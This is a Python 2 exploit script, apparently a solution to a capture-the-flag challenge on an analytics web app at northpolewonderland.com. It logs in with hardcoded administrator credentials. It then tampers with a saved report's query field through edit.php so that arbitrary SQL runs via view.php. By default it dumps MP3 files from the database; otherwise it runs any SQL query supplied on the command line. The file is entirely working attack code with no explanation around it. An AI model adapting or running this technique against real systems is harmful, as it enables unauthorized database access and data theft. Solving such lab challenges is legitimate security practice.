import sys
import pyquery #makes extracting the table easier
import requests

BASE = "https://analytics.northpolewonderland.com/"
AUTH_USER = 'administrator'
AUTH_PASS = 'KeepWatchingTheSkies'
MP3_QUERY = "select filename, TO_BASE64(mp3) as mp3 from audio where filename != 'discombobulatedaudio2.mp3'"

def extract_uuid_from_query_response(resp):
    #<p>Saved your report as <a href='view.php?id=21990bcc-a386-4e87-b34c-1746b020de72'>report-21990bcc-a386-4e87-b34c-1746b020de72</a></p>
    for line in resp.splitlines():
        if 'Saved your report as' in line:
            #Grab from id= to the next single quote
            return line.split("id=")[1].split("'")[0]

def extract_table(txt):
    """Grab results from html"""
    #print html
    p = pyquery.PyQuery(txt)
    try :
        table = p('table').eq(0)
    except IndexError:
        print "No results"
        return
    header = table("thead")
    rows = table("tbody")("tr")
    col_names = [c.text_content().strip() for c in header("th")]

    for row in rows:
        cols = [c.text_content().strip() for c in row.findall("td")]
        yield dict(zip(col_names, cols))

class Analytics:
    def __init__(self):
        self.s = requests.session()

    def _post(self, path, *args, **kwargs):
        r = self.s.post(BASE + path, data=kwargs)
        r.raise_for_status()
        return r

    def _get(self, path, *args, **kwargs):
        r = self.s.get(BASE + path, params=kwargs)
        r.raise_for_status()
        return r

    def login(self):
        return self._post("login.php", username=AUTH_USER, password=AUTH_PASS)

    def query(self):
        return self._post("query.php", save="on", date="2016-12-12", type="usage").text

    def edit(self, uuid, key, value):
        data = {"id": uuid, key: value}
        resp = self._get("edit.php", **data)
        for r in resp.iter_lines():
            if 'UPDATE' in r:
                return True
        raise Exception("Editing failed :(")

    def view(self, uuid):
        txt = self._get("view.php", id=uuid).text
        return extract_table(txt)

    def run_arbitrary_sql(self, query):
        print "Sending arbitrary query.."
        query_response = self.query()
        uuid =  extract_uuid_from_query_response(query_response)
        print "Query UUID is ", uuid
        print "Editing query to be", query
        self.edit(uuid, "query", query)
        print "Executing query.."
        rows = self.view(uuid)
        return rows

def extract_mp3():
    a = Analytics()
    print "Logging in..."
    a.login()
    for row in a.run_arbitrary_sql(MP3_QUERY):
        print "Extracting mp3 contents.."
        contents = row['mp3'].decode('base64')
        fn = row['filename']
    print "Filename from database is {}, writing output to mp3.mp3 to be safe :-)".format(fn)
    with open('mp3.mp3', 'w') as f:
        f.write(contents)

def run_query(q):
    a = Analytics()
    a.login()
    for row in a.run_arbitrary_sql(q):
        print row

if __name__ == "__main__":
    if len(sys.argv) > 1:
        run_query(sys.argv[1])
    else:
        extract_mp3()
